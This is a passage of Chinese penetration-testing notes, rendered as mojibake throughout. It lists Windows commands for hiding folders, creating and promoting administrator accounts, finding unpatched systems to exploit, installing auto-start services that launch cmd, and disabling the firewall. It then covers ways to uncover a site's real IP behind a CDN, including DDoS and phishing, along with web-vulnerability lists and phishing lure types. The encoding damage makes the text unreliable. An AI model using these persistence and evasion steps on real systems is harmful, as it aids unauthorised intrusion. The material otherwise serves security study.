ç„¶åå†åˆ›å»º3ä¸ªæ–‡ä»¶å¤¹ for l %i in (1 1 3) do md c:\\mydoc%i ## åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹è¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š attrib +h s d c:\\mydoc ## å¦‚æœæƒ³è¦å–æ¶ˆæŸä¸ªç›®å½•åŠå…¶å­ç›®å½•ä¸‹çš„æ‰€æœ‰éšè—å±æ€§ï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤å³å¯ï¼š attrib -h s d c:\\mydoc 1-1-8 æŒ‡å®šæˆ‘ä»¬è‡ªå·±çš„ç»ˆç«¯ setp c:\\www\\1111\\cmd.exe 1-1-9 net user## 1ã€å¢åŠ ç”¨æˆ· net user username password add ## 2ã€åˆ é™¤ç”¨æˆ· net user username del ## 3ã€ä¿®æ”¹ç”¨æˆ·å¯†ç  net user username newpassword ## 4ã€å‡çº§ç”¨æˆ·ä¸ºç®¡ç†å‘˜ net localgroup administrators username add ## 5ã€å°†ç®¡ç†å‘˜è´¦æˆ·é™ä¸ºæ™®é€šç”¨æˆ· net localgroup administrators username del ## 6ã€æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ· net user ## 7ã€æŸ¥çœ‹ç‰¹å®šç”¨æˆ·ä¿¡æ¯ net user username ## 8ã€æ¿€æ´»ç‰¹å®šç”¨æˆ· net user username active:yes ## 9ã€ç¦ç”¨ç‰¹å®šç”¨æˆ· net user username active:no ## 10ã€æŸ¥çœ‹ç‰¹å®šç”¨æˆ·ç»„æ‰€åŒ…å«çš„ç”¨æˆ· net localgroup groupname 1-1-10 å¿«é€ŸæŸ¥æ‰¾æœªæ‰“è¡¥ä¸çš„EXP## å¿«é€ŸæŸ¥æ‰¾æœªæ‰“è¡¥ä¸çš„ expï¼Œå¯ä»¥æœ€å®‰å…¨çš„å‡å°‘ç›®æ ‡æœºçš„æœªçŸ¥é”™è¯¯ï¼Œä»¥å…å½±å“ä¸šåŠ¡ã€‚ å‘½ä»¤è¡Œä¸‹æ‰§è¡Œæ£€æµ‹æœªæ‰“è¡¥ä¸çš„å‘½ä»¤å¦‚ä¸‹ï¼š systeminfomicropoor.txt(for %i in ( KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find i â€œ%iâ€|| @echo %i you can fuck)del f q a micropoor.txt 1-1-11 scSC æ˜¯ç”¨äºä¸æœåŠ¡æ§åˆ¶ç®¡ç†å™¨å’ŒæœåŠ¡è¿›è¡Œé€šä¿¡çš„å‘½ä»¤è¡Œç¨‹åºã€‚æä¾›çš„åŠŸèƒ½ç±»ä¼¼äºâ€œæ§åˆ¶é¢æ¿â€ä¸­â€œç®¡ç†å·¥å…·â€é¡¹ä¸­çš„â€œæœåŠ¡â€ã€‚ åˆ›å»º # å®‰è£…æœåŠ¡ ## æœåŠ¡åç§°æ˜¯redisï¼Œ C:\\Windows\\system32sc create redis binpath â€œD:\\work\\databases\\Redis-x64-3.2.100\\redis-server.exe â€“service-run D:\\work\\databases\\Redis-x64-3.2.100\\redis.windows.confâ€ ## ç›´æ¥åˆ›å»ºæ—¶ä¹Ÿèƒ½è®¾ç½®æ˜¾ç¤ºåç§° C:\\Windows\\system32sc create redis binPathD:\\work\\databases\\Redis-x64-3.2.100\\redis-server.exe DisplayName redis æŸ¥è¯¢ # ä½¿ç”¨queryå‚æ•° C:\\Windows\\system32sc query redis SERVICE_NAME: redis TYPE : 10 WIN32_OWN_PROCESS STATE : 1 STOPPED WIN32_EXIT_CODE : 1077 (0x435) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 # ä½¿ç”¨queryexå‚æ•°ï¼ˆæ¯”queryæŸ¥è¯¢å¤šå‡ºä¸¤ä¸ªç»“æœï¼‰ C:\\Windows\\system32sc queryex redis SERVICE_NAME: redis TYPE : 10 WIN32_OWN_PROCESS STATE : 1 STOPPED WIN32_EXIT_CODE : 1077 (0x435) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 PID : 0 FLAGS : å¯åŠ¨ # å…ˆæŸ¥è¯¢æœåŠ¡çŠ¶æ€(STOPPED) C:\\Windows\\system32sc query redis SERVICE_NAME: redis TYPE : 10 WIN32_OWN_PROCESS STATE : 1 STOPPED WIN32_EXIT_CODE : 1077 (0x435) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 # å¯åŠ¨æœåŠ¡(RUNNING) C:\\Windows\\system32sc start redis SERVICE_NAME: redis TYPE : 10 WIN32_OWN_PROCESS STATE : 4 RUNNING (STOPPABLE, NOT_PAUSABLE, ACCEPTS_PRESHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 PID : 8896 FLAGS : åœæ­¢ # ç›´æ¥åœæ­¢ sc stop redis # æ·»åŠ åœæ­¢åŸå› å’Œå¤‡æ³¨ sc stop redis 1:2:8 â€œmust stop redisâ€ é…ç½® # é…ç½®æœåŠ¡çš„æ˜¾ç¤ºåç§°ï¼Œè¿™é‡Œå°†æœåŠ¡çš„æ˜¾ç¤ºåå­—redisæ”¹æˆREDISæ˜¾ç¤ºï¼ˆdisplaynameä¸åŒºåˆ†å¤§å°å†™ï¼Œä¸”ç­‰å·åæœ‰ç©ºæ ¼ï¼‰ C:\\Windows\\system32sc config redis displayname REDIS [SC] ChangeServiceConfig æˆåŠŸ # é…ç½®æœåŠ¡æè¿° C:\\Windows\\system32sc description redis â€œredisçš„æè¿°å†…å®¹â€ [SC] ChangeServiceConfig2 æˆåŠŸ åˆ é™¤ #åˆ é™¤æœåŠ¡ C:\\Windows\\system32sc delete redis [SC] DeleteService æˆåŠŸ # åˆ é™¤åå†æŸ¥çœ‹ C:\\Windows\\system32sc query redis [SC] EnumQueryServicesStatus:OpenService å¤±è´¥ 1060: æŒ‡å®šçš„æœåŠ¡æœªå®‰è£…ã€‚ å®ä¾‹ æ‰‹åŠ¨å¯åŠ¨ sc Create æ‰‹åŠ¨ binPath â€œcmd K startâ€ type own type interact sc start æ‰‹åŠ¨ sc Create æ‰‹åŠ¨å¯åŠ¨ binPath â€œcmd K startâ€ type own type interact start DEMAND sc start æ‰‹åŠ¨å¯åŠ¨ æµ‹è¯• sc Create aini binPath â€œcmd K startâ€ type own type interact start AUTO sc start aini 1-1-12 netsha) å¯ç”¨é˜²ç«å¢™ C:netsh firewall set opmode mode enable b) å…³é—­é˜²ç«å¢™ C:netsh firewall set opmode mode disable c) é‡ç½®é˜²ç«å¢™ C:netsh firewall reset 1ã€æŸ¥çœ‹ç½‘ç»œé…ç½® netsh interface ip show {é€‰é¡¹} {é€‰é¡¹}å¯ä»¥æ˜¯ï¼š address - ## æ˜¾ç¤º IP åœ°å€é…ç½®ã€‚ config - ## æ˜¾ç¤º IP åœ°å€å’Œæ›´å¤šä¿¡æ¯ã€‚ dns - ## æ˜¾ç¤º DNS æœåŠ¡å™¨åœ°å€ã€‚ icmp - ### æ˜¾ç¤º ICMP ç»Ÿè®¡ã€‚ interface - ## æ˜¾ç¤º IP æ¥å£ç»Ÿè®¡ã€‚ ipaddress - ## æ˜¾ç¤ºå½“å‰ IP åœ°å€ ipnet - ## æ˜¾ç¤º IP çš„ç½‘ç»œåˆ°åª’ä½“çš„æ˜ å°„ã€‚ ipstats - ## æ˜¾ç¤º IP ç»Ÿè®¡ã€‚ joins - ## æ˜¾ç¤ºåŠ å…¥çš„å¤šæ’­ç»„ã€‚ offload - ## æ˜¾ç¤ºå¸è½½ä¿¡æ¯ã€‚ tcpconn - ##æ˜¾ç¤º TCP è¿æ¥ã€‚ tcpstats - ## æ˜¾ç¤º TCP ç»Ÿè®¡ã€‚ udpconn - ## æ˜¾ç¤º UDP è¿æ¥ã€‚ udpstats - ## æ˜¾ç¤º UDP ç»Ÿè®¡ã€‚ wins - ## æ˜¾ç¤º WINS æœåŠ¡å™¨åœ°å€ã€‚ 2ã€é…ç½®æ¥å£IPç½‘å…³IP netsh interface ip set address â€œæœ¬åœ°è¿æ¥â€ static 192.168.1.100 255.255.255.0 192.168.1.253 â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” C:netsh interface ip show config æ¥å£ â€œæœ¬åœ°è¿æ¥â€ çš„é…ç½® DHCP å¯ç”¨ å¦ IP åœ°å€ 192.168.1.100 å­ç½‘æ©ç  255.255.255.0 é»˜è®¤ç½‘å…³: 192.168.1.253 GatewayMetric: 0 InterfaceMetric 0 é™æ€é…ç½®çš„ DNS æœåŠ¡å™¨: 202.96.209.134 é™æ€é…ç½®çš„ WINS æœåŠ¡å™¨: æ—  ç”¨å“ªä¸ªå‰ç¼€æ³¨å†Œ: åªæ˜¯ä¸»è¦ 3ã€é…ç½®è‡ªåŠ¨æ¢å–IPåœ°å€,DNSåœ°å€åŠwinsåœ°å€ netsh interface ip set address â€œæœ¬åœ°è¿æ¥â€ dhcp netsh interface ip set dns â€œæœ¬åœ°è¿æ¥â€ dhcp netsh interface ip set wins â€œæœ¬åœ°è¿æ¥â€ dhcp 4ã€é…ç½®é™æ€IPåœ°å€ï¼ŒDNSåœ°å€åŠwinsåœ°å€ netsh interface ip set address â€œæœ¬åœ°è¿æ¥â€ static 192.168.1.253 netsh interface ip set dns â€œæœ¬åœ°è¿æ¥â€ static 202.96.209.6 netsh interface ip set wins â€œæœ¬åœ°è¿æ¥â€ static 192.168.1.1 5ã€æŸ¥çœ‹å¹¶å¯¼å‡ºç½‘ç»œé…ç½®æ–‡ä»¶ C:netsh -c interface dump c:\\dump.txt ï¼ˆâ€â€è¡¨ç¤ºå¯¼å‡ºã€‚â€â€è¡¨ç¤ºè¿½åŠ ï¼‰ # # æ¥å£é…ç½® # pushd interface reset all popd # æ¥å£é…ç½®ç»“æŸ # # æ¥å£é…ç½® # pushd interface ipv6 uninstall popd # æ¥å£é…ç½®ç»“æŸ # â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”- # ISATAP é…ç½® # â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”- pushd interface ipv6 isatap popd # ISATAP é…ç½®ç»“æŸ # â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”- # 6to4 é…ç½® # â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”- pushd interface ipv6 6to4 reset popd # 6to4 é…ç½®ç»“æŸ # # ç«¯å£ä»£ç†é…ç½® # pushd interface portproxy reset popd # ç«¯å£ä»£ç†é…ç½®ç»“æŸ # â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”- # æ¥å£ IP é…ç½® # â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”- pushd interface ip # â€œæœ¬åœ°è¿æ¥â€ çš„æ¥å£ IP é…ç½® set address nameâ€æœ¬åœ°è¿æ¥â€ sourcestatic addr192.168.1.5 mask255.255.255.0 set address nameâ€æœ¬åœ°è¿æ¥â€ gateway192.168.1.1 gwmetric0 set dns nameâ€æœ¬åœ°è¿æ¥â€ sourcestatic addr202.96.209.134 registerPRIMARY set wins nameâ€æœ¬åœ°è¿æ¥â€ sourcestatic addrnone popd # æ¥å£ IP é…ç½®ç»“æŸ 6ã€å¯¼å…¥ç½‘ç»œé…ç½®æ–‡ä»¶ C:netsh -f c:\\dump.txt C:netsh exec c:\\dump.txt ä¸‰ï¼ŒçŸ¥è¯†ç‚¹3-1 å¦‚ä½•æ£€æµ‹CDN## 1ï¼Œnslookup è¿›è¡Œæ£€æµ‹ ## 2ï¼Œå¤šping æ£€æµ‹ http://ping.chinaz.com/ http://ping.aizhan.com/ http://ce.cloud.360.cn/ 3-2 ç»•è¿‡æ–¹æ³• â€” æ‰¾çœŸå®IP## ping ä¸€ä¸ªä¸å­˜åœ¨çš„äºŒçº§åŸŸå ## æŸ¥çœ‹ IP ä¸ åŸŸåç»‘å®šçš„å†å²è®°å½•ï¼Œå¯èƒ½ä¼šå­˜åœ¨ä½¿ç”¨ CDN å‰çš„è®°å½• https://dnsdb.io/zh-cn/ ###DNSæŸ¥è¯¢ https://x.threatbook.cn/ ###å¾®æ­¥åœ¨çº¿ http://toolbar.netcraft.com/site_report?url=www.bigcoders.cn ###åœ¨çº¿åŸŸåä¿¡æ¯æŸ¥è¯¢ http://viewdns.info/ ###DNSã€IPç­‰æŸ¥è¯¢ https://tools.ipip.net/cdn.php ###CDNæŸ¥è¯¢IP https://securitytrails.com/domain/bigcoders.cn/dns ## è§‚çœ‹ipå˜åŒ– http://toolbar.netcraft.com/site_report?url=www.sina.com ## æŸ¥è¯¢å­åŸŸå ## ä¸»è¦çš„æ„æ€æ˜¯ä¸€ä¸ªå…¬å¸å¯èƒ½æœ‰ä¸Šç™¾ä¸ªç½‘ç«™ï¼Œä¸ä¸€å®šæ¯ä¸ªç½‘ç«™éƒ½ä½¿ç”¨äº†cdnã€‚ ï¼ˆ1ï¼‰å¾®æ­¥åœ¨çº¿(https://x.threatbook.cn/) ï¼ˆ2ï¼‰DnsdbæŸ¥è¯¢æ³•(https://dnsdb.io/zh-cn/) ï¼ˆ3ï¼‰Google æœç´¢Google site:baidu.com -wwwå°±èƒ½æŸ¥çœ‹é™¤wwwå¤–çš„å­åŸŸå ï¼ˆ4ï¼‰å„ç§å­åŸŸåæ‰«æå™¨ ï¼ˆ5ï¼‰ç½‘ç»œç©ºé—´å¼•æ“æœç´¢æ³• å¸¸è§çš„æœ‰ä»¥å‰çš„é’Ÿé¦—ä¹‹çœ¼ï¼Œshodanï¼Œfofaæœç´¢ã€‚ ## åˆ©ç”¨SSLè¯ä¹¦å¯»æ‰¾çœŸå®åŸå§‹IP ## ç½‘ç«™æ¼æ´æŸ¥æ‰¾ 1ï¼‰ç›®æ ‡æ•æ„Ÿæ–‡ä»¶æ³„éœ²ï¼Œä¾‹å¦‚ï¼šphpinfoä¹‹ç±»çš„æ¢é’ˆã€â€info.phpâ€, â€œphpinfo.phpâ€, â€œtest.phpâ€, â€œl.phpâ€ã€GitHubä¿¡æ¯æ³„éœ²ç­‰ã€‚ 2ï¼‰æŸ¥çœ‹æ¼æ´æ‰«ææŠ¥è­¦ä¿¡æ¯ï¼Œæ‰‹å·¥é€ æˆé¡µé¢æŠ¥é”™ 3ï¼‰XSSç›²æ‰“ï¼Œå‘½ä»¤æ‰§è¡Œåå¼¹shellï¼ŒSSRFç­‰ã€‚ 4ï¼‰æ— è®ºæ˜¯ç”¨ç¤¾å·¥è¿˜æ˜¯å…¶ä»–æ‰‹æ®µï¼Œæ‹¿åˆ°äº†ç›®æ ‡ç½‘ç«™ç®¡ç†å‘˜åœ¨CDNçš„è´¦å·ï¼Œä»è€Œåœ¨ä»CDNçš„é…ç½®ä¸­æ‰¾åˆ°ç½‘ç«™çš„çœŸå®IPï¼Œè¿™ä¸ªå¤ªéš¾äº†ï¼Œå¦‚æœè¦åšçš„ è¯ï¼Œä¸€èˆ¬æ˜¯é’“é±¼çš„æ–¹å¼ï¼Œæ¯”å¦‚å‘é‚®ä»¶ä¹‹ç±»çš„ã€‚ 5ï¼‰ç›´æ¥pingä¸€ä¸ªasdfasdf.baidu.comï¼Œå¦‚æœå¼€å¯äº†æ³›åŸŸåè§£æï¼Œé‚£ä¹ˆpingåˆ°çš„ä¸€èˆ¬æ˜¯çœŸå®ipåœ°å€ã€‚ ## ç½‘ç«™é‚®ä»¶è®¢é˜…æŸ¥æ‰¾ RSSé‚®ä»¶è®¢é˜…ï¼Œå¾ˆå¤šç½‘ç«™éƒ½è‡ªå¸¦ sendmailï¼Œä¼šå‘é‚®ä»¶ç»™æˆ‘ä»¬ï¼Œæ­¤æ—¶æŸ¥çœ‹é‚®ä»¶æºç é‡Œé¢å°±ä¼šåŒ…å«æœåŠ¡å™¨çš„çœŸå® IP äº†ã€‚ ## é€šè¿‡å›½å¤–æœåŠ¡å™¨pingå¯¹æ–¹ç½‘ç«™ ## ç”¨ Zmap æ‰«å…¨ç½‘ å°±æ˜¯æ‰«ææ•´ä¸ªç½‘æ®µï¼Œæ¯”å¦‚å°±æ‰«æ80ã€443ç«¯å£ï¼Œæ¯ä¸ªç½‘ç«™ä¸æ˜¯éƒ½æœ‰æ ‡é¢˜æ ‡ç­¾ç ï¼Œä»¥å…³é”®å­—çš„æ–¹å¼æ¥åŒ¹é…æå–ï¼Œä¸è¿‡è¿™ä¸ªæ–¹æ³•å¤ªéº»çƒ¦äº†ã€‚ ## DDOSæŠŠ CDN æµé‡æ‰“å…‰ 3-3 ä»€ä¹ˆæ˜¯è¶Šæƒï¼Œè¶Šæƒæ¼æ´åŸç†## è¶Šæƒ ## æ‰€è°“è¶Šæƒï¼Œå°±æ˜¯ç»•è¿‡æƒé™é™åˆ¶æˆ–è€…åœ¨æƒé™é™åˆ¶ä¸å¤Ÿä¸¥æ ¼çš„æƒ…å†µä¸‹å»è®¿é—®åŸæ¥ä¸åº”è¯¥è®¿é—®åˆ°çš„èµ„æºã€‚æ¯”å¦‚ï¼šç›®å½•è¶Šæƒã€ä»»æ„è®¢å•éå†çš„ä¸šåŠ¡ç±»è¶Šæƒç­‰ç­‰ï¼Œå…¶ä¸­ï¼Œç›®å½•è¶Šæƒåˆ†ä¸ºå¤šç§ï¼Œå¸¸è§çš„æœ‰ï¼šç›®å½•æƒé™è®¾ç½®ä¸ä¸¥æ ¼ã€æƒé™æ²¡æœ‰é€’å½’è®¾ç½®ã€webç«™ç‚¹è¶Šæƒè®¿é—®ã€ç”¨æˆ·æƒé™é‰´æƒè¢«ç»•è¿‡ã€‚ ## åŸç† ## å¦‚æœä½¿ç”¨Aç”¨æˆ·çš„æƒé™å»æ“ä½œBç”¨æˆ·çš„æ•°æ®ï¼ŒAçš„æƒé™å°äºBçš„æƒé™ï¼Œå¦‚æœèƒ½å¤ŸæˆåŠŸæ“ä½œï¼Œåˆ™ç§°ä¹‹ä¸ºè¶Šæƒæ“ä½œã€‚è¶Šæƒæ¼æ´å½¢æˆçš„åŸå› æ˜¯åå°ä½¿ç”¨äº†ä¸åˆç†çš„æƒé™æ ¡éªŒè§„åˆ™å¯¼è‡´çš„ã€‚ 3-4 ä»€ä¹ˆæ˜¯APTæ”»å‡»## æœ‰ç»„ç»‡ã€æœ‰ç‰¹å®šç›®æ ‡ã€æŒç»­æ—¶é—´æé•¿çš„æ–°å‹æ”»å‡»å’Œå¨èƒï¼Œå›½é™…ä¸Šæœ‰çš„ç§°ä¹‹ä¸º APTï¼ˆAdvanced Persistent Threatï¼‰æ”»å‡» ## é«˜çº§æŒç»­æ€§å¨èƒ(Advanced Persistent Threat)æ˜¯æŒ‡ç»„ç»‡(ç‰¹åˆ«æ˜¯æ”¿åºœ)æˆ–è€…å°å›¢ä½“ä½¿ç”¨å…ˆè¿›çš„æ”»å‡»æ‰‹æ®µå¯¹ç‰¹å®šç›®æ ‡è¿›è¡Œé•¿æœŸæŒç»­æ€§ç½‘ç»œæ”»å‡»çš„æ”»å‡»å½¢å¼ 3-5 WEBåº”ç”¨å…¶å®ƒå¸¸è§æ¼æ´æ€»ç»“1. æš´åŠ›çŒœè§£ç”¨æˆ·ååŠå¯†ç  2. æ‰«æ•æ„Ÿç›®å½•åŠå¤‡ä»½æ–‡ä»¶ 3. PhpMyadminçš„ä¸‡èƒ½å¯†ç  4. æŠ¥é”™é¡µé¢çš„å›¾ç‰‡ä¹Ÿæ˜¯å¯ä»¥å­˜åœ¨åå°„å‹XSSçš„ 5. éšè—åŸŸä¸­å¯èƒ½å­˜ç€æ˜æ–‡å¯†ç  6. é€»è¾‘æ¼æ´â€”â€”ä»»æ„ç”¨æˆ·å¯†ç é‡ç½® 7. çŸ­ä¿¡ç‚¸å¼¹ 8. SVNæºç æ³„éœ² 9. æ‰«æä¸€ä¸‹å±€åŸŸç½‘å…±äº« 10. å…³æ³¨ä¸€äº›éä¸»æµçš„æ¼æ´ï¼Œå¦‚HTTPå“åº”æ‹†åˆ†æ¼æ´ 11. æ‰«ä¸€ä¸‹ç«¯å£ nmapæ‰«ç«¯å£ï¼Œå¼€æ”¾ç€9091ã€21ç«¯å£ï¼Œæµè§ˆå™¨æ‰“å¼€å‘ç°9091æ˜¯å¦ä¸€ä¸ªWEBåº”ç”¨ 12. å‘æ˜éšè—çš„é“¾æ¥åœ°å€ 13. å‘æ˜ä¸€äº›è¶Šæƒçš„æµ‹è¯•é¡µé¢ 14. IISçŸ­æ–‡ä»¶åæ³„éœ²æ¼æ´ è¿™ä¸ªæ¼æ´åªæœ‰å¾®è½¯çš„æ“ä½œç³»ç»Ÿæ‰æœ‰ï¼Œ2008ã€2012ç­‰éƒ½æœ‰ã€‚ ## å±å®³ï¼šMicrosoft IISåœ¨å®ç°ä¸Šå­˜åœ¨æ–‡ä»¶æšä¸¾æ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨æ­¤æ¼æ´æšä¸¾ç½‘ç»œæœåŠ¡å™¨æ ¹ç›®å½•ä¸­çš„æ–‡ä»¶ã€‚å±å®³ï¼šæ”»å‡»è€…å¯ä»¥åˆ©ç”¨â€œâ€ å­—ç¬¦\tçŒœè§£æˆ–éå†æœåŠ¡å™¨ä¸­çš„æ–‡ä»¶åï¼Œæˆ–å¯¹IISæœåŠ¡å™¨ä¸­çš„.Net Frameworkè¿›è¡Œæ‹’ç»æœåŠ¡æ”»å‡»ã€‚ ## éªŒè¯æ–¹æ³•è¯´æ˜ï¼šåœ¨å‘½ä»¤è¡Œæ¨¡å¼è¿è¡ŒIIS-shortnameå·¥å…·ï¼Œæ‰§è¡Œjava scanner 2 20 http://www.xxx.comå›è½¦æ‰§è¡Œï¼Œçœ‹æ˜¯å¦èƒ½éå†æœ åŠ¡å™¨ä¸­çš„æ–‡ä»¶åã€‚æ˜¾ç¤ºå‡ºæ¥çš„ä¸æ˜¯æ–‡ä»¶çš„å…¨åï¼Œåªæ˜¾ç¤ºä¸€éƒ¨åˆ†ï¼Œæ‰€ä»¥å«åšçŸ­æ–‡ä»¶åæ¼æ´ï¼Œå› ä¸ºåé¢å¯ä»¥è¿›è¡ŒçŒœæµ‹ã€‚è¿™ä¸ªæ¼æ´ä¿®å¤éœ€è¦ ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œå…·ä½“æ€ä¹ˆæ“ä½œï¼Œå¤§å®¶å»ç½‘ä¸Šæœä¸€ä¸‹çŸ­æ–‡ä»¶åæ¼æ´ä¿®å¤å°±èƒ½æ‰¾åˆ°ã€‚ 15. jQueryå­˜åœ¨XSSæ¼æ´ ## ç‰ˆæœ¬ä½äº1.7çš„jQueryè¿‡æ»¤ç”¨æˆ·è¾“å…¥æ•°æ®æ‰€ä½¿ç”¨çš„æ­£åˆ™è¡¨è¾¾å¼å­˜åœ¨ç¼ºé™·ï¼Œå¯èƒ½å¯¼è‡´LOCATION.HASHè·¨ç«™æ¼æ´ã€‚ ## éªŒè¯æ–¹æ³•è¯´æ˜ï¼šç›´æ¥åœ¨ç«ç‹æµè§ˆå™¨æ‰“å¼€JQueryæ¼æ´åœ°å€ï¼ŒæŸ¥çœ‹æºä»£ç é‡Œé¢çš„JQueryç‰ˆæœ¬æ˜¯å¦å­˜åœ¨ä½äº1.7ï¼Œå¦‚æœä½äº1.7é‚£ä¹ˆå°±å­˜åœ¨æ¼ æ´ã€‚ 16. ç›®å½•æµè§ˆæ¼æ´ ## å±å®³ï¼šç”±äºWebæœåŠ¡å™¨æƒé™é…ç½®ä¸å½“ï¼Œé€ æˆç”¨æˆ·å¯ä»¥ç›´æ¥æµè§ˆWebç½‘ç«™ç›®å½•ï¼Œå¦‚å›¾ç‰‡ç›®å½•images,javascriptç›®å½•js, ä¸åŒçš„ç›®å½•æ½œåœ¨ çš„å±é™©\tæ˜¯ä¸åŒçš„ã€‚æ”»å‡»è€…ä¸€èˆ¬åˆ©ç”¨å¸¸è§ç›®å½•ä¸­å¯èƒ½åŒ…å«çš„æ•æ„Ÿæ–‡ä»¶è·å–æ•æ„Ÿä¿¡æ¯ã€‚ ## éªŒè¯æ–¹æ³•è¯´æ˜ï¼šç›´æ¥åœ¨ç«ç‹æµè§ˆå™¨æ‰“å¼€ç›®å½•æµè§ˆé¡µé¢ï¼Œçœ‹æ˜¯å¦å­˜åœ¨åˆ—ç›®å½•ã€‚ 17. URLè·³è½¬æ¼æ´ 18. æ¡†æ¶é’“é±¼æ¼æ´ 19. ç‚¹å‡»åŠ«æŒ ## åº”ç”¨ç¨‹åºæ²¡æœ‰å¯¹ç”¨æˆ·æäº¤çš„æ•°æ®è¿›è¡Œæœ‰æ•ˆçš„è¿‡æ»¤æˆ–è½¬æ¢ï¼Œæ”»å‡»è€…å¯å‘WEBé¡µé¢é‡Œæ’å…¥å¯¹ç»ˆç«¯ç”¨æˆ·é€ æˆå½±å“æˆ–æŸå¤±çš„æ¶æ„é“¾æ¥ã€‚ 20. HTTPæŠ¥å¤´è¿½è¸ªæ¼æ´ 21. DNSåŸŸä¼ é€æ¼æ´ 22. ç§æœ‰IPæ³„éœ² 23. ç½‘ç«™ç‰©ç†è·¯å¾„ä¿¡æ¯æ³„æ¼æ¼æ´ ## æŠ¥é”™ä¿¡æ¯ä¸­æç¤ºäº†ç½‘ç«™ç‰©ç†è·¯å¾„ï¼Œä¹Ÿæ˜¯æ¼æ´ã€‚ç®—ä¸­å±æ¼æ´ã€‚å…¶å®ä¸­å±å’Œä½å±æ¼æ´éƒ½æ˜¯è¾…åŠ©å‹æ¼æ´ï¼Œä¸èƒ½ç›´æ¥æ‹¿åˆ°æœåŠ¡å™¨æƒé™ï¼Œå’Œå…¶ä»–é«˜ å±æ¼æ´é…åˆçš„ã€‚ 24. ç³»ç»Ÿé‡è£…æ¼æ´ ## æ˜“å•†å®â€CMSå­˜åœ¨ç³»ç»Ÿé‡è£…æ¼æ´ï¼Œé€šè¿‡æ­¤æ¼æ´å¯é‡æ–°å®‰è£…è¯¥CMSï¼Œå¹¶å–å¾—ç½‘ç«™çš„ç®¡ç†å‘˜æƒé™ã€‚ä¸ºä¸å½±å“ç½‘ç«™çš„æ­£å¸¸è¿è¡Œï¼Œæœªè¿›è¡Œæ¼æ´ å®é™…éªŒè¯ã€‚æ‰€ä»¥ä¸€å®šè¦æ³¨æ„è¿™ç§ç±»å‹çš„åˆå§‹åŒ–é¡µé¢ï¼Œä¸è¦è®©åˆ«äººè®¿é—®ï¼Œä¸¥æ ¼æ§åˆ¶ã€‚ 25. ä»»æ„æ–‡ä»¶ä¸‹è½½ 26.ä¸å®‰å…¨çš„è¯·æ±‚æ–¹æ³• https://zhuanlan.zhihu.com/p/96482835 https://blog.csdn.net/dltsbydh/article/details/96323697 3-6 å¸¸è§é€»è¾‘æ¼æ´æ¡ˆä¾‹1ã€ä»»æ„ä¿®æ”¹ç”¨æˆ·èµ„æ–™ 2ã€ä»»æ„æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯ 3ã€ä»»æ„é‡ç½®ç”¨æˆ·å¯†ç  4ã€æ¶æ„æ³¨å†Œ 5ã€æ¶æ„çŸ­ä¿¡ 6ã€å…¶å®ƒé€»è¾‘æ¼æ´ 3-7 å¸¸è§é’“é±¼æ–¹å¼## exeç¨‹åºæŒ‚é©¬ ## å¿«æ·æ–¹å¼æŒ‚é©¬ ## æ‰©å±•åä¼ªé€  ## officeæ–‡ä»¶æŒ‚é©¬ 3-8 é‚®ä»¶é’“é±¼## SPF â€”â€”â€”- ä¸€ç§ä»¥IPåœ°å€è®¤è¯ç”µå­é‚®ä»¶å‘ä»¶äººèº«ä»½çš„æŠ€æœ¯ ## DKIM â€”â€”â€”â€“ DKIMè®©ä¼ä¸šå¯ä»¥æŠŠåŠ å¯†ç­¾åæ’å…¥åˆ°å‘é€çš„ç”µå­é‚®ä»¶ä¸­ï¼Œç„¶åæŠŠè¯¥ç­¾åä¸åŸŸåå…³è”èµ·æ¥ ## DMARC â€”â€”â€”â€“ æ˜¯txtè®°å½•ä¸­çš„ä¸€ç§ï¼Œæ˜¯ä¸€ç§åŸºäºç°æœ‰çš„SPFå’ŒDKIMåè®®çš„å¯æ‰©å±•ç”µå­é‚®ä»¶è®¤è¯åè®®ï¼Œå…¶æ ¸å¿ƒæ€æƒ³æ˜¯é‚®ä»¶çš„å‘é€æ–¹é€šè¿‡ç‰¹å®šæ–¹å¼ï¼ˆDNSï¼‰å…¬å¼€è¡¨æ˜è‡ªå·±ä¼šç”¨åˆ°çš„å‘ä»¶æœåŠ¡å™¨ï¼ˆSPFï¼‰ã€å¹¶å¯¹å‘å‡ºçš„é‚®ä»¶å†…å®¹è¿›è¡Œç­¾å(DKIM)ï¼Œè€Œé‚®ä»¶çš„æ¥æ”¶æ–¹åˆ™æ£€æŸ¥æ”¶åˆ°çš„é‚®ä»¶æ˜¯å¦æ¥è‡ªå‘é€æ–¹æˆæƒè¿‡çš„æœåŠ¡å™¨å¹¶æ ¸å¯¹ç­¾åæ˜¯å¦æœ‰æ•ˆ 3-8-1 è¦æƒ³æŸ¥çœ‹ä¸€ä¸ªåŸŸåæ˜¯å¦é…ç½®äº†SPFå®‰å…¨ç­–ç•¥nslookup -typetxt .com.cn #æŸ¥çœ‹dnsä¸­txtç±»å‹çš„è®°å½• dig -t txt 163.com æœªé…ç½®çš„æ˜¯è¿™æ ·ï¼š é…ç½®äº†spfåè®®çš„çœ‹åˆ°çš„ä¿¡æ¯å¦‚ä¸‹ 